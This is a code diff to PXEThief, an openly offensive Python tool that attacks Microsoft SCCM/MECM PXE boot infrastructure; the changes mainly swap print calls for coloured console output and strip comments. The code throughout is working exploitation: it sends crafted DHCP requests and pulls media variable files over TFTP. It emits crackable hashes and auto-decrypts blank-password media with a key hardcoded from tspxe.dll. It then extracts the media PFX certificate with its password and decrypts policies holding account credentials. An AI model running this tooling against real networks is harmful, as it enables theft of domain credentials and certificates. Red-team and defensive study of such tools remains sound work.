@@ -9,6 +9,8 @@
 # You should have received a copy of the GNU General Public License along with PXEThief. If not, see <https://www.gnu.org/licenses/>.
 
 import sys
+import warnings
+warnings.filterwarnings("ignore")
 
 def check_dependencies():
     module_names = {
@@ -18,7 +20,8 @@ def check_dependencies():
         'Crypto': 'pycryptodome>=3.14.1',
         'lxml': 'lxml>=4.9.1',
         'cryptography': 'cryptography>=38.0.0',
-        'asn1crypto': 'asn1crypto>=1.5.1'
+        'asn1crypto': 'asn1crypto>=1.5.1',
+        'rich': 'rich>=13.0.0'
     }
     missing = []
     for mod, pkg in module_names.items():
@@ -33,7 +36,12 @@ def check_dependencies():
 
 check_dependencies()
 
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
 from scapy.all import *
+conf.verb = 0
+
 import binascii
 import ipaddress
 import socket
@@ -54,6 +62,34 @@ from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
 from asn1crypto import cms as asn1_cms
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.text import Text
+from rich import box
+
+console = Console(highlight=False)
+
+def info(msg):
+    console.print(f"[bold cyan][*][/] {msg}")
+
+def success(msg):
+    console.print(f"[bold green][+][/] {msg}")
+
+def warning(msg):
+    console.print(f"[bold yellow][!][/] {msg}")
+
+def error(msg):
+    console.print(f"[bold red][-][/] {msg}")
+
+def found(msg):
+    console.print(f"[bold magenta][!][/] {msg}")
+
+def data(label, value):
+    console.print(f"    [dim]{label}:[/] [bold white]{value}[/]")
+
+def cred(label, value):
+    console.print(f"    [bold yellow]{label}:[/] [bold red]{value}[/]")
 
 #Scapy global variables
 osName = platform.system()
@@ -61,14 +97,13 @@ clientIPAddress = ""
 clientMacAddress = ""
 
 #HTTP Configuration Options
-USING_PROXY = False #Configure proxying for debugging support
-
-USING_TLS = False #HTTPS and client certificate support
+USING_PROXY = False
+USING_TLS = False
 CERT_FILE = "output.crt"
 KEY_FILE = "output-key.key"
 
 # MECM Task Sequence Config Options
-SCCM_BASE_URL = "" #The beginning of the DP URL as read from settings.ini; takes precedence over the value retrieved from the media file in decrypt_media_file(), if needed
+SCCM_BASE_URL = ""
 
 # Debug Config Options
 DUMP_MPKEYINFORMATIONMEDIA_XML = False
@@ -84,7 +119,7 @@ def safe_decode_utf16le(data, label="data"):
     try:
         return data.decode("utf-16-le")
     except UnicodeDecodeError:
-        print("[!] Warning: " + label + " contained invalid UTF-16-LE sequences (replaced with placeholders)")
+        warning(f"{label} contained invalid UTF-16-LE sequences (replaced with placeholders)")
         return data.decode("utf-16-le", errors="replace")
 
 def cms_decrypt(private_key, encrypted_data):
@@ -92,25 +127,21 @@ def cms_decrypt(private_key, encrypted_data):
     content_info = asn1_cms.ContentInfo.load(encrypted_data)
     enveloped_data = content_info['content']
 
-    # Get recipient info to extract encrypted content-encryption key
     recipient_infos = enveloped_data['recipient_infos']
     recipient_info = recipient_infos[0].chosen
     encrypted_key = recipient_info['encrypted_key'].native
 
-    # Decrypt content-encryption key with RSA private key
     content_encryption_key = private_key.decrypt(
         encrypted_key,
         asym_padding.PKCS1v15()
     )
 
-    # Get encrypted content and algorithm info
     encrypted_content_info = enveloped_data['encrypted_content_info']
     encrypted_content = encrypted_content_info['encrypted_content'].native
     algorithm = encrypted_content_info['content_encryption_algorithm']
     algo_oid = algorithm['algorithm'].dotted
     iv = algorithm['parameters'].native
 
-    # Decrypt based on algorithm OID
     if algo_oid == '1.2.840.113549.3.7':  # 3DES-CBC
         cipher = Cipher(algorithms.TripleDES(content_encryption_key), modes.CBC(iv))
     elif algo_oid == '2.16.840.1.101.3.4.1.2':  # AES-128-CBC
@@ -123,7 +154,6 @@ def cms_decrypt(private_key, encrypted_data):
     decryptor = cipher.decryptor()
     decrypted = decryptor.update(encrypted_content) + decryptor.finalize()
 
-    # Strip PKCS#7 padding
     pad_len = decrypted[-1]
     if 0 < pad_len <= len(decrypted) and all(b == pad_len for b in decrypted[-pad_len:]):
         decrypted = decrypted[:-pad_len]
@@ -131,14 +161,14 @@ def cms_decrypt(private_key, encrypted_data):
     return decrypted
 
 def auto_convert_pfx_to_pem(pfx_data, password_bytes, base_filename):
-    """Auto-convert PFX to PEM cert+key files for mTLS use (fixes #12, #8)."""
+    """Auto-convert PFX to PEM cert+key files for mTLS use."""
     try:
         pk, cert_obj, chain = pkcs12.load_key_and_certificates(pfx_data, password_bytes)
         if cert_obj:
             cert_file = base_filename.replace('.pfx', '.crt')
             with open(cert_file, 'wb') as f:
                 f.write(cert_obj.public_bytes(serialization.Encoding.PEM))
-            print("[+] PEM certificate written to " + cert_file)
+            success(f"PEM certificate written to [bold]{cert_file}[/]")
         if pk:
             key_file = base_filename.replace('.pfx', '-key.pem')
             with open(key_file, 'wb') as f:
@@ -147,9 +177,9 @@ def auto_convert_pfx_to_pem(pfx_data, password_bytes, base_filename):
                     serialization.PrivateFormat.TraditionalOpenSSL,
                     serialization.NoEncryption()
                 ))
-            print("[+] PEM private key written to " + key_file)
+            success(f"PEM private key written to [bold]{key_file}[/]")
     except Exception as e:
-        print("[!] Warning: Could not auto-convert PFX to PEM: " + str(e))
+        warning(f"Could not auto-convert PFX to PEM: {e}")
 
 def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
     """Native Python TFTP client (RFC 1350 + RFC 2348 blksize). No external tftp binary needed."""
@@ -163,7 +193,6 @@ def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(timeout)
 
-    # Build RRQ: opcode(2) + filename + \0 + mode + \0 [+ blksize option]
     request = pystruct.pack("!H", OPCODE_RRQ) + remote_path.encode("ascii") + b"\x00" + b"octet" + b"\x00"
     if blksize != 512:
         request += b"blksize" + b"\x00" + str(blksize).encode("ascii") + b"\x00"
@@ -177,27 +206,25 @@ def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
 
     try:
         while True:
-            data, addr = sock.recvfrom(65536)
+            data_recv, addr = sock.recvfrom(65536)
 
             if server_tid is None:
                 server_tid = addr[1]
             elif addr[1] != server_tid:
                 continue
 
-            opcode = pystruct.unpack("!H", data[:2])[0]
+            opcode = pystruct.unpack("!H", data_recv[:2])[0]
 
             if opcode == OPCODE_OACK:
-                # Server accepted blksize negotiation
-                options = data[2:].split(b"\x00")
+                options = data_recv[2:].split(b"\x00")
                 for i in range(0, len(options) - 1, 2):
                     if options[i].lower() == b"blksize":
                         negotiated_blksize = int(options[i + 1])
-                # ACK the OACK with block 0
                 sock.sendto(pystruct.pack("!HH", OPCODE_ACK, 0), (server_ip, server_tid))
 
             elif opcode == OPCODE_DATA:
-                block_num = pystruct.unpack("!H", data[2:4])[0]
-                block_data = data[4:]
+                block_num = pystruct.unpack("!H", data_recv[2:4])[0]
+                block_data = data_recv[4:]
 
                 if block_num == expected_block:
                     file_data.extend(block_data)
@@ -207,12 +234,11 @@ def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
                     if len(block_data) < negotiated_blksize:
                         break
                 elif block_num < expected_block:
-                    # Duplicate, re-ACK
                     sock.sendto(pystruct.pack("!HH", OPCODE_ACK, block_num), (server_ip, server_tid))
 
             elif opcode == OPCODE_ERROR:
-                err_code = pystruct.unpack("!H", data[2:4])[0]
-                err_msg = data[4:].rstrip(b"\x00").decode("ascii", errors="replace")
+                err_code = pystruct.unpack("!H", data_recv[2:4])[0]
+                err_msg = data_recv[4:].rstrip(b"\x00").decode("ascii", errors="replace")
                 raise RuntimeError("TFTP error " + str(err_code) + ": " + err_msg)
             else:
                 raise RuntimeError("Unexpected TFTP opcode: " + str(opcode))
@@ -225,7 +251,6 @@ def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
     return len(file_data)
 
 def validate_ip_or_resolve_hostname(input):
-
     try:
         ipaddress.ip_address(input)
         ip_address = input
@@ -233,16 +258,14 @@ def validate_ip_or_resolve_hostname(input):
         try:
             ip_address = socket.gethostbyname(input.strip())
         except socket.gaierror:
-            print("[-] " + input + " does not appear to be a valid hostname or IP address (or DNS does not resolve)")
+            error(f"{input} does not appear to be a valid hostname or IP address (or DNS does not resolve)")
             sys.exit(0)
-
     return ip_address
 
 def print_interface_table():
-    print("[!] Set the interface to be used by scapy in manual_interface_selection_by_id in the settings.ini file")
-    print()
-    print("Available Interfaces:")
-    print(conf.ifaces)
+    warning("Set the interface to be used by scapy in [bold]manual_interface_selection_by_id[/] in settings.ini")
+    console.print()
+    console.print(conf.ifaces)
 
 def get_config_section(section_name):
     config = configparser.ConfigParser(allow_no_value=True)
@@ -250,21 +273,17 @@ def get_config_section(section_name):
     return config[section_name]
 
 def configure_scapy_networking(ip_address):
-
-    #If user has provided a target IP address, use it to determine interface to send traffic out of
     if ip_address is not None:
         ip_address = validate_ip_or_resolve_hostname(ip_address)
-
-        route_info = conf.route.route(ip_address,verbose=0)
+        route_info = conf.route.route(ip_address, verbose=0)
         interface_ip = route_info[1]
 
         if interface_ip != "0.0.0.0":
             conf.iface = route_info[0]
         else:
-            print("[-] No route found to target host " + ip_address)
+            error(f"No route found to target host {ip_address}")
             sys.exit(-1)
     else:
-        #Automatically attempt sane interface configuration
         config = configparser.ConfigParser(allow_no_value=True)
         config.read('settings.ini')
         scapy_config = config["SCAPY SETTINGS"]
@@ -273,52 +292,43 @@ def configure_scapy_networking(ip_address):
             try:
                 manual_selection_mode_id = scapy_config.getint("manual_interface_selection_by_id")
             except ValueError:
-                print("Invalid value set for 'manual_interface_selection_by_id' in 'settings.ini' file. Please specify an integer associated with the desired interface, or leave the field blank for automatic interface selection")
-                print("Valid interfaces and interface indexes can be checked by running pxethief.py 10")
+                error("Invalid value for [bold]manual_interface_selection_by_id[/] in settings.ini — must be an integer")
+                info("Run [bold]pxethief.py 10[/] to list valid interface indexes")
                 sys.exit(-1)
         else:
             manual_selection_mode_id = None
 
         if manual_selection_mode_id:
-            print("[+] Attempting to use Interface ID " + str(manual_selection_mode_id) + " provided in setttings.ini")
+            info(f"Using manually selected Interface ID [bold]{manual_selection_mode_id}[/]")
             conf.iface = conf.ifaces.dev_from_index(manual_selection_mode_id)
         else:
-            print("[+] Attempting automatic interface detection")
+            info("Attempting automatic interface detection")
             selection_mode = scapy_config.getint("automatic_interface_selection_mode")
-            # 1 - Use interface that can reach default GW as output interface, 2 - First interface with no autoconfigure or localhost IP address
             try_next_mode = False
             if selection_mode == 1:
+                default_gw = conf.route.route("0.0.0.0", verbose=0)
+                default_gw_ip = conf.route.route("0.0.0.0", verbose=0)[2]
 
-                default_gw = conf.route.route("0.0.0.0",verbose=0)
-                default_gw_ip = conf.route.route("0.0.0.0",verbose=0)[2]
-
-                #If there is a default gw found, set scapy to use that interface
                 if default_gw_ip != '0.0.0.0':
                     conf.iface = default_gw[0]
                 else:
                     try_next_mode = True
 
             if selection_mode == 2 or try_next_mode:
-
                 loopback_range = IPv4Network('127.0.0.0/8')
                 autoconfigure_ranges = IPv4Network('169.254.0.0/16')
 
                 interfaces = scapy.interfaces.get_working_ifaces()
                 for interface in interfaces:
-
-                    #Read IP from interface
-                    ip =  get_if_raw_addr(interface)
+                    ip = get_if_raw_addr(interface)
                     if ip:
                         ip = IPv4Address(inet_ntop(socket.AF_INET, ip))
                     else:
                         continue
 
-                    #If it is a valid IP and is not a loopback or autoconfigure IP, use this interface
                     if ip and not (ip in loopback_range) and not (ip in autoconfigure_ranges):
                         conf.iface = interface
                         break
-
-                #Implement check on conf.iface value
 
     global clientIPAddress
     global clientMacAddress
@@ -327,131 +337,101 @@ def configure_scapy_networking(ip_address):
     mac_str = get_if_hwaddr(conf.iface)
     clientMacAddress = binascii.unhexlify(mac_str.replace(":", "").replace("-", ""))
 
-    bind_layers(UDP,BOOTP,dport=4011,sport=68) # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
-    bind_layers(UDP,BOOTP,dport=68,sport=4011)
+    bind_layers(UDP, BOOTP, dport=4011, sport=68)
+    bind_layers(UDP, BOOTP, dport=68, sport=4011)
     iface_desc = getattr(conf.iface, 'description', str(conf.iface))
-    print("[+] Using interface: " + str(conf.iface) + " - " + iface_desc)
+    success(f"Using interface: [bold]{conf.iface}[/] — {iface_desc}")
 
-# Find PXE server with DHCP discover packet with the right options set
 def find_pxe_server():
+    info("Sending DHCP Discover to find PXE boot server...")
 
-    print("")
-    print("Sending initial DHCP Discover to find PXE boot server...")
-    print("")
-
-    #DHCP Discover packet is from IP 0.0.0.0, with destination 255.255.255.255 and ff:ff:ff:ff:ff:ff destination MAC address. Need to ask for DHCP options 66 and 67 to find PXE servers
     pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=clientMacAddress)/DHCP(options=[("message-type","discover"),('param_req_list',[1,3,6,66,67]),"end"])
 
-    conf.checkIPaddr = False # Make scapy ignore IP address when checking for responses (needed because we sent to a broadcast address)
-    ans = srp1(pkt) #This could fail if multiple DHCP servers exist in the environment and only some of them offer the PXE server in their response
+    conf.checkIPaddr = False
+    ans = srp1(pkt, timeout=10)
     conf.checkIPaddr = True
 
-    #TODO: Make sure received packet is a DHCP packet, before next bit of code
     if ans:
         packet = ans
-
-        # Pull out DHCP offer from received answer packet
         dhcp_options = packet[1][DHCP].options
 
-        tftp_server = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"),None)
+        tftp_server = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"), None)
         if tftp_server:
-            tftp_server = tftp_server.rstrip(b"\0").decode("utf-8") # DHCP option 66 is TFTP Server Name
+            tftp_server = tftp_server.rstrip(b"\0").decode("utf-8")
 
-            boot_file = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"),None)
+            boot_file = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"), None)
             if boot_file:
-                boot_file = boot_file.rstrip(b"\0").decode("utf-8") # DHCP option 67 is Bootfile Name
+                boot_file = boot_file.rstrip(b"\0").decode("utf-8")
     else:
-        print("[-] No DHCP responses received with PXE boot options")
+        error("No DHCP responses received with PXE boot options")
         sys.exit(-1)
 
     tftp_server = validate_ip_or_resolve_hostname(tftp_server.strip())
 
-    print("")
-    print("PXE Server IP: " + tftp_server + " Boot File Location: " + boot_file)
+    success(f"PXE Server: [bold]{tftp_server}[/] — Boot File: [bold]{boot_file}[/]")
     return tftp_server
 
-# Ask SCCM for location to download variable file. This is done with a DHCP Request packet
 def get_variable_file_path(tftp_server):
+    info("Asking ConfigMgr for media variables and BCD file locations...")
 
-    print("")
-    print("[+] Asking ConfigMgr for location to download the media variables and BCD files...")
-    print("")
-
-    #Media Variable file is generated by sending DHCP request packet to port 4011 on a PXE enabled DP. This contains DHCP options 60, 93, 97 and 250
     pkt = IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
     ("message-type","request"),
     ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
-    ('pxe_client_architecture', b'\x00\x00'), #x86 architecture
-    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
-    #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
+    ('pxe_client_architecture', b'\x00\x00'),
+    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),
     ('vendor_class_id', b'PXEClient'),
-    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
+    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'),
     "end"])
 
-    ans = sr1(pkt,timeout=10,iface=conf.iface,verbose=2,filter="udp port 4011 or udp port 68") # sr return value: ans,unans/packetpair1,packetpair2 (i.e. PacketPairList)/sent packet,received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)
+    ans = sr1(pkt, timeout=10, iface=conf.iface, filter="udp port 4011 or udp port 68")
 
-    #TODO: Make sure received packets are DHCP packets before next bit of code
     encrypted_key = None
     if ans:
         packet = ans
         dhcp_options = packet[1][DHCP].options
 
-        #Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location
         option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
         if variables_file:
-            packet_type = variables_file[0] #First byte of the option data determines the type of data that follows
-            data_length = variables_file[1] #Second byte of the option data is the length of data that follows
+            packet_type = variables_file[0]
+            data_length = variables_file[1]
 
-            #If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
             if packet_type == 1:
-                #Skip first two bytes of option and copy the file name by data_length
                 variables_file = variables_file[2:2+data_length]
                 variables_file = variables_file.decode('utf-8')
-            #If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
             elif packet_type == 2:
-                #Skip first two bytes of option and copy the encrypted data by data_length
                 encrypted_key = variables_file[2:2+data_length]
 
-                #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                 string_length_index = 2 + data_length + 1
                 beginning_of_string_index = 2 + data_length + 2
-
-                #Read out string length
                 string_length = variables_file[string_length_index]
-
-                #Read out variables.dat file name and decode to utf-8 string
                 variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
                 variables_file = variables_file.decode('utf-8')
-            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
+            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")
         else:
-            print("[-] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location")
+            error("No variable file location (DHCP option 243) found in server response")
             sys.exit(-1)
     else:
-        print("[-] No DHCP responses received from MECM server " + tftp_server + ". This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports")
+        error(f"No DHCP response from MECM server {tftp_server} — check IP address and firewall rules")
         sys.exit(-1)
 
-    print("")
-    print("[!] Variables File Location: " + variables_file)
-    print("[!] BCD File Location: " + bcd_file)
+    found(f"Variables file: [bold]{variables_file}[/]")
+    found(f"BCD file: [bold]{bcd_file}[/]")
 
     if encrypted_key:
         global BLANK_PASSWORDS_FOUND
         BLANK_PASSWORDS_FOUND = True
-
-        print("[!] Blank password on PXE boot found!")
-        return [variables_file,bcd_file,encrypted_key]
+        found("[bold red]Blank password on PXE boot found![/]")
+        return [variables_file, bcd_file, encrypted_key]
     else:
-        return [variables_file,bcd_file]
+        return [variables_file, bcd_file]
 
 def get_pxe_files(ip):
-
     if ip != None:
-        print("[+] Targeting user-specified host: " + ip)
+        info(f"Targeting user-specified host: [bold]{ip}[/]")
         tftp_server_ip = validate_ip_or_resolve_hostname(ip)
     else:
-        print("[+] Discovering PXE Server through DHCP...")
+        info("Discovering PXE Server through DHCP...")
         tftp_server_ip = find_pxe_server()
-        print("[+] PXE Server found from DHCP at " + tftp_server_ip + "!")
 
     answer_array = get_variable_file_path(tftp_server_ip)
 
@@ -463,21 +443,20 @@ def get_pxe_files(ip):
     var_file_name = variables_file.split("\\")[-1]
     bcd_file_name = bcd_file.split("\\")[-1]
 
-    # Download both files via built-in TFTP client
-    print("[+] Downloading " + var_file_name + " via TFTP...")
+    info(f"Downloading [bold]{var_file_name}[/] via TFTP...")
     try:
         size = tftp_download(tftp_server_ip, variables_file, var_file_name)
-        print("[+] Downloaded " + var_file_name + " (" + str(size) + " bytes)")
+        success(f"Downloaded [bold]{var_file_name}[/] ({size} bytes)")
     except Exception as e:
-        print("[-] Failed to download media variables file via TFTP: " + str(e))
+        error(f"Failed to download media variables file via TFTP: {e}")
         sys.exit(-1)
 
-    print("[+] Downloading " + bcd_file_name + " via TFTP...")
+    info(f"Downloading [bold]{bcd_file_name}[/] via TFTP...")
     try:
         size = tftp_download(tftp_server_ip, bcd_file, bcd_file_name)
-        print("[+] Downloaded " + bcd_file_name + " (" + str(size) + " bytes)")
+        success(f"Downloaded [bold]{bcd_file_name}[/] ({size} bytes)")
     except Exception as e:
-        print("[!] Warning: Failed to download BCD file: " + str(e))
+        warning(f"Failed to download BCD file: {e}")
 
     if BLANK_PASSWORDS_FOUND:
         config = configparser.ConfigParser(allow_no_value=True)
@@ -485,60 +464,54 @@ def get_pxe_files(ip):
         general_config = config["GENERAL SETTINGS"]
         auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
         if auto_exploit_blank_password:
-            print("[!] Attempting automatic exploitation...")
-            print("[!] Hashcat hash: $sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex())
-            use_encrypted_key(encrypted_key,var_file_name)
+            warning("Attempting automatic exploitation...")
+            hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
+            found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
+            use_encrypted_key(encrypted_key, var_file_name)
         else:
-            print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
+            warning("Change [bold]auto_exploit_blank_password[/] in settings.ini to 1 to attempt exploitation")
     else:
-        print("[+] User configured password detected for task sequence media.")
+        info("User configured password detected for task sequence media")
         try:
-            print("[!] Hashcat hash: $sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex())
+            hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
+            found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
         except Exception:
             pass
-        print("[+] Crack with hashcat using the SCCM module, then run: pxethief.py 3 <file> <cracked-password>")
+        info("Crack with hashcat using the SCCM module, then run: [bold]pxethief.py 3 <file> <cracked-password>[/]")
 
-def generateSignedData(data,private_key):
-
+def generateSignedData(data, private_key):
     signature = private_key.sign(
         data,
         asym_padding.PKCS1v15(),
         hashes.SHA1()
     )
-    # Reverse bytes: cryptography produces big-endian, MECM server expects little-endian
     reversed_sig = signature[::-1]
     return binascii.hexlify(reversed_sig).decode()
 
-def generateClientTokenSignature(data,private_key):
-
+def generateClientTokenSignature(data, private_key):
     signature = private_key.sign(
         data,
         asym_padding.PKCS1v15(),
         hashes.SHA256()
     )
-    # Reverse bytes: cryptography produces big-endian, MECM server expects little-endian
     reversed_sig = signature[::-1]
     return binascii.hexlify(reversed_sig).decode()
 
 def deobfuscate_credential_string(credential_string):
-    #print(credential_string)
     key_data = binascii.unhexlify(credential_string[8:88])
     encrypted_data = binascii.unhexlify(credential_string[128:])
-
     key = media_crypto.aes_des_key_derivation(key_data)
     last_16 = math.floor(len(encrypted_data)/8)*8
-    return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])
+    return media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])
 
 def decrypt_media_file(path, password):
-
     password_is_string = isinstance(password, str)
-    print("[+] Media variables file to decrypt: " + path)
+    info(f"Media variables file: [bold]{path}[/]")
     if password_is_string:
-        print("[+] Password provided: " + password)
+        info(f"Password: [bold]{password}[/]")
     else:
-        print("[+] Password bytes provided: 0x" + password.hex())
+        info(f"Password bytes: [bold]0x{password.hex()}[/]")
 
-    # Decrypt encryted media variables file
     encrypted_file = media_crypto.read_media_variable_file(path)
     try:
         if password_is_string:
@@ -547,120 +520,104 @@ def decrypt_media_file(path, password):
             key = media_crypto.aes_des_key_derivation(password)
         last_16 = math.floor(len(encrypted_file)/16)*16
         try:
-            decrypted_media_file = media_crypto.aes128_decrypt(encrypted_file[:last_16],key[:16])
+            decrypted_media_file = media_crypto.aes128_decrypt(encrypted_file[:last_16], key[:16])
         except UnicodeDecodeError:
-            decrypted_media_file = media_crypto.aes256_decrypt(encrypted_file[:last_16],key[:32])
-        decrypted_media_file =  decrypted_media_file[:decrypted_media_file.rfind('\x00')]
+            decrypted_media_file = media_crypto.aes256_decrypt(encrypted_file[:last_16], key[:32])
+        decrypted_media_file = decrypted_media_file[:decrypted_media_file.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
-        print("[+] Successfully decrypted media variables file with the provided password!")
+        success("Successfully decrypted media variables file!")
     except Exception as e:
-        print("[-] Failed to decrypt media variables file. Check the password provided is correct")
-        print("    Error: " + str(e))
+        error(f"Failed to decrypt media variables file — check the password")
+        error(f"  {e}")
         sys.exit(-1)
 
     return wf_decrypted_ts
 
 def process_pxe_bootable_and_prestaged_media(media_xml):
-
-    #Parse media file in order to pull out PFX password and PFX bytes
     root = ET.fromstring(media_xml.encode("utf-16-le"))
     smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
     smsTSMediaPFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text
 
     global SCCM_BASE_URL
     if SCCM_BASE_URL == "":
-        print("[+] Identifying Management Point URL from media variables (Subsequent requests may fail if DNS does not resolve!)")
-        #Partial Media - SMSTSLocationMPs
+        info("Identifying Management Point URL from media variables...")
         SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
         SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')
         if SMSTSMP is not None:
             SCCM_BASE_URL = SMSTSMP.text
         elif SMSTSLocationMPs is not None:
             SCCM_BASE_URL = SMSTSLocationMPs.text
-
-        print("[+] Management Point URL set to: " + SCCM_BASE_URL)
+        success(f"Management Point URL: [bold]{SCCM_BASE_URL}[/]")
     else:
-        print("[+] Using manually set Management Point URL of: " + SCCM_BASE_URL)
+        info(f"Using manually set Management Point URL: [bold]{SCCM_BASE_URL}[/]")
 
-    download_and_decrypt_policies_using_certificate(smsMediaGuid,smsTSMediaPFX)
+    download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX)
 
 def process_full_media(password, policy):
-
     encrypted_policy = media_crypto.read_media_variable_file(policy)
 
     try:
-        print("[+] Password provided for policy decryption: " + password)
+        info(f"Password for policy decryption: [bold]{password}[/]")
         key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
         last_16 = math.floor(len(encrypted_policy)/16)*16
-        decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16],key[:16])
-        decrypted_ts =  decrypted_ts[:decrypted_ts.rfind('\x00')]
+        decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16], key[:16])
+        decrypted_ts = decrypted_ts[:decrypted_ts.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_ts if c.isprintable())
-        print("[+] Successfully Decrypted Policy \"" + policy +"\"!")
-
+        success(f"Successfully decrypted policy [bold]{policy}[/]!")
     except Exception as e:
-        print("[-] Failed to decrypt policy")
-        print("    Error: " + str(e))
+        error(f"Failed to decrypt policy: {e}")
         sys.exit(-1)
 
     process_task_sequence_xml(wf_decrypted_ts)
     process_naa_xml(wf_decrypted_ts)
 
 def use_encrypted_key(encrypted_key, media_file_path):
-
-    #ProxyDHCP Option 243
     length = encrypted_key[0]
-    encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
-    encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
-    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Hardcoded in tspxe.dll
+    encrypted_bytes = encrypted_key[1:1+length]
+    encrypted_bytes = encrypted_bytes[20:-12]
+    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9'
 
-    key = media_crypto.aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response
-    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+    key = media_crypto.aes_des_key_derivation(key_data)
+    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16], key[:16])[:10])
 
-    #Perform bit extension
-    LEADING_BIT_MASK =  b'\x80'
+    LEADING_BIT_MASK = b'\x80'
     new_key = bytearray()
-    for byte in struct.unpack('10c',var_file_key):
+    for byte in struct.unpack('10c', var_file_key):
         if (LEADING_BIT_MASK[0] & byte[0]) == 128:
             new_key = new_key + byte + b'\xFF'
         else:
             new_key = new_key + byte + b'\x00'
 
-    media_variables = decrypt_media_file(media_file_path,new_key)
+    media_variables = decrypt_media_file(media_file_path, new_key)
 
-    print("[!] Writing media variables to variables.xml")
-    write_to_file("variables",media_variables)
+    warning("Writing media variables to [bold]variables.xml[/]")
+    write_to_file("variables", media_variables)
 
-    #Parse media file in order to pull out PFX password and PFX bytes
     root = ET.fromstring(media_variables.encode("utf-16-le"))
     smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
     smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
     smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
-    filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
+    filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
 
-    print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
-    write_to_binary_file(filename,smsTSMediaPFX)
